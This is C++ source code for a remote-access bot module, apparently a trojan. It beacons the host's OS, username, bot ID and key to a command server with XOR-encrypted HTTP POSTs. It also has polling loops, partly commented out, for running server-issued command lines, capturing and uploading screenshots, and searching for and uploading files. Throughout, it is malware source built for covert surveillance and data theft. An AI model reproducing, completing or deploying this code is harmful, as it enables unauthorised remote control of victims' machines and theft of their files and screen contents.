
#include "remotescript.h"
DWORD RemoteScript::init(void){ return 0; }
DWORD RemoteScript::uninit(void){ return 0; }
void RemoteScript::_firstHello(PCORE_DATA _coreData){
	char os[MAX_OS_NAME];
	char username[MAX_USER_NAME];
	OS::_getOS(os);
	User::_getUserName(username);

	char cpostData[1024];
	CWA(kernel32, ZeroMemory)(cpostData, sizeof(cpostData));
	sprintf_s(cpostData, sizeof(cpostData), "os=%s&username=%s&id=%s&key=%s", os, username, _coreData->cBotID, _coreData->coreConfig.key.key);
	
	BYTE cpostDataEncrypted[1024];
	CWA(kernel32, ZeroMemory)(cpostDataEncrypted, sizeof(cpostDataEncrypted));
	//printf("key = %s\r\n", _coreData->coreConfig.key.key);
	Crypter::_XOR((BYTE*)_coreData->coreConfig.key.key, 
		strlen(_coreData->coreConfig.key.key),
		cpostDataEncrypted,
		(BYTE*)cpostData,strlen(cpostData));
	DWORD dwDataSize = strlen(cpostData);
	Http::_postDataToServer(_coreData, cpostDataEncrypted, dwDataSize);
	//printf("cpostDataEncrypted: %s\r\n", cpostDataEncrypted);
	/**/
}
void RemoteScript::_getCommand(PCORE_DATA _coreData){
	//char os[MAX_OS_NAME];
	//char username[MAX_USER_NAME];
	//char time[MAX_TIME];
	// char cmd[MAX_ * 2];
	// UserInfo::getOS(os);
	//UserInfo::getUserName(username);
	while (1)
	{
		//UserInfo::getTime(time);
		//sprintf_s(data,MAX,COMMAND_PATH,Bot::getBotId(),os,username,time);
		//printf("data: %s\r\n",data);
		//Http::getCommand(_actionData->bot_id, os, username, time, cmd);
		//Bot::parseCommand(_actionData, cmd);

		// printf("Connect result: %d\r\n",connectResult);
		Sleep(5000);
	}
	return;
}
void RemoteScript::_excecuteCmd(PCORE_DATA _coreData){
	while (1){
		printf("Executing commandline\r\n");
		/*
		if (_actionData->cli == true){
			DWORD dwWaitResult = WaitForSingleObject(_actionData->ghMutex, INFINITE);
			// convert _actionData->commandline to WCHAR
			size_t size = strlen(_actionData->command_line) + 1;
			wchar_t* commandline_wchar_t = (wchar_t*)malloc(sizeof(wchar_t)*size);
			size_t outSize;
			mbstowcs_s(&outSize, commandline_wchar_t, size, _actionData->command_line, size - 1);
			CommandLine::_execute(_actionData, commandline_wchar_t);
			if (dwWaitResult == WAIT_OBJECT_0){
				__try {
					_actionData->cli = false;
					printf("_actionData->cli = false: %d\r\n", GetLastError());
				}
				__finally{
					if (!ReleaseMutex(_actionData->ghMutex)){ printf("Error: %d\r\n", GetLastError); }
				}
			}
			else if (dwWaitResult == WAIT_ABANDONED){
				//continue;
			}
			delete[]commandline_wchar_t;
		}
		*/
		Sleep(5000);
	}
}
void RemoteScript::_captureScreen(PCORE_DATA _coreData){
	//while(_actionData->lock != 3){}
	char filePath[MAX_PATH];
	GetModuleFileNameA(NULL, filePath, MAX_PATH);
	if (GetLastError() == ERROR_SUCCESS){
		printf("GetModuleFileName CaptureScreen Success: %s\r\n", filePath);
	}
	else{
		printf("GetModuleFileName CaptureScreen Failed: %d\r\n", GetLastError());
	}
	int iFilePath = strlen(filePath);
	while (iFilePath >= 0 && filePath[iFilePath] != '\\'){
		filePath[iFilePath] = 0;
		iFilePath--;
	}
	if (filePath[iFilePath] == '\\') filePath[iFilePath] = 0;
	printf("Temp activated from: %s\r\n", filePath);

	char c_fileScreenShot[1024];

	sprintf_s(c_fileScreenShot, 1024, "%s\\%s", filePath, FILE_SCREENSHOT);

	while (1){
		printf("Getting Screenshot setting\r\n");
		/*
		if (_actionData->scr == true)
		{

			DWORD dwWaitResult = WaitForSingleObject(_actionData->ghMutex, INFINITE);
			/*
			printf("dwWaitResult: %08x\r\n",dwWaitResult);
			printf("WAIT_FAILED %8x\r\n",WAIT_FAILED);
			printf("WAIT_ABANDONED %8x\r\n",WAIT_ABANDONED);
			printf("WAIT_OBJECT_0 %8x\r\n",WAIT_OBJECT_0);
			printf("WAIT_TIMEOUT %8x\r\n",WAIT_TIMEOUT);
			
			if (dwWaitResult == WAIT_OBJECT_0){
				__try {
					_actionData->scr = false;
					printf("screen _actionData->scr = false: %d\r\n", GetLastError());
				}
				__finally{
					if (!ReleaseMutex(_actionData->ghMutex)){ printf("Error: %d\r\n", GetLastError); }
				}
			}
			else if (dwWaitResult == WAIT_ABANDONED){
				//continue;
			}

			printf("true             == %d\r\n", true);
			printf("_actionData->scr == %d\r\n", _actionData->scr);
			CaptureScreen::gdiscreen(c_fileScreenShot);
			printf("CaptureScreen\r\n");
			printf("c_fileScreenShot: %s\r\n", c_fileScreenShot);
			Http::uploadFile(c_fileScreenShot, "scr", _actionData->bot_id, "");
			printf("Upload Screenshot\r\n");

		}
		//while(_actionData->lock != 3){}

		*/
		Sleep(5000);
	}
}
void RemoteScript::_listFile(PCORE_DATA _actionData){
	/*
	* Get filename to search from server via http api every 1s
	* if server return filename, bot will do search, save result to file then upload to server
	*/
	char filePath[MAX_PATH];
	GetModuleFileNameA(NULL, filePath, MAX_PATH);
	if (GetLastError() == ERROR_SUCCESS){
		printf("GetModuleFileName ListFile Success: %s\r\n", filePath);
	}
	else{
		printf("GetModuleFileName ListFile Failed: %d\r\n", GetLastError());
	}
	int iFilePath = strlen(filePath);
	while (iFilePath >= 0 && filePath[iFilePath] != '\\'){
		filePath[iFilePath] = 0;
		iFilePath--;
	}
	if (filePath[iFilePath] == '\\') filePath[iFilePath] = 0;
	printf("Temp activated from: %s\r\n", filePath);


	char c_fileSearch[1024];
	char c_fileUploaded[1024];

	sprintf_s(c_fileSearch, 1024, "%s\\%s", filePath, FILE_SEARCH);
	sprintf_s(c_fileUploaded, 1024, "%s\\%s", filePath, FILE_SEARCH_UPLOADED);

	printf("c_fileSearch: %s\r\n", c_fileSearch);
	printf("c_fileSeachUploaded: %s\r\n", c_fileUploaded);

	//Sleep(100000);
	while (1)
	{
		//while(_actionData->lock != 3){}
		printf("Getting file search\r\n");
		/*
		if (_actionData->sch == true){
			printf("OK\r\n");
			printf("File Searching %s\r\n", _actionData->file_search);
			
			FileSearcher::search(_actionData->file_search);
			//
			
			printf("Search done\r\n");
			Sleep(5000);
			FILE* file;
			fopen_s(&file, c_fileSearch, "r"); // should check the result
			if (file == NULL) continue;
			char line[1024];
			while (fgets(line, sizeof(line), file)) {
				for (unsigned int i = 0; i<strlen(line); i++){
					if (line[i] == '\r' || line[i] == '\n'){
						line[i] = '\0';
					}
				}

				if (!FileSearcher::isInFile(c_fileUploaded, line)){
					printf("upload file %s", line);
					Http::uploadFile(line, "sch", _actionData->bot_id, line);
					FILE *fileUploaded;
					fopen_s(&fileUploaded, c_fileUploaded, "a+");
					if (fileUploaded != NULL){
						fprintf_s(fileUploaded, "%s\n", line);
						fclose(fileUploaded);
					}
				}

			}
			Http::postDataToServer(_actionData->bot_id, "sch", "done", "");
			fclose(file);

			
			DWORD dwWaitResult = WaitForSingleObject(_actionData->ghMutex, INFINITE);
			if (dwWaitResult == WAIT_OBJECT_0){
				__try {
					_actionData->sch = false;
				}
				__finally{
					if (!ReleaseMutex(_actionData->ghMutex)){ printf("Error: %d\r\n", GetLastError);// Handle error }
				}
			}
			else if (dwWaitResult == WAIT_ABANDONED){
				continue;
			}

		}
		*/
		Sleep(5000);
	}
}